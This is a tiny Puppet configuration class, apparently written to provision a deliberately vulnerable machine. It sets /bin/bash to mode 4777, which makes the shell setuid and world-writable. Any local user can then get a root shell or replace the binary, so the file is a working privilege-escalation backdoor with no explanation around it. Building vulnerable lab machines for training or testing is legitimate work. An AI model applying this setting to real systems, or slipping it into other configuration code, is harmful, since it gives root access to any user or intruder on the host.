class suid_root_bash::config {
  file  { '/bin/bash':
    ensure => present,
    mode => '4777',
  }
}
